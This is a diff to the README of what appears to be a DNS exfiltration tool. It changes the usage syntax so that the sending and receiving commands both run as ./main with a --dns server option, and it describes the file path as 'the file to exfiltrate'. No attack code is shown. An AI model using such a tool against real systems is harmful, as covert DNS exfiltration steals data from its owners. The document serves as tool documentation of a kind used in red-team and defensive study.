@@ -6,10 +6,11 @@ Domain names are currently hardcoded in, no need to supply your own
 ## Use
 
 ### Sending
-Proper syntax is ./sender --fileIn <filepath> --dns <IP>
+Proper syntax is ./main --fileIn <filepath> --dns <IP>
 - filepath points to the file to exfiltrate
 - IP is the DNS server to query
 
 ### Receiving
-Proper syntax is ./receiver --fileOut <filepath>
+Proper syntax is ./main --fileOut <filepath> --dns <IP>
 - filepath is the location to save the output
+- IP is the DNS server to query
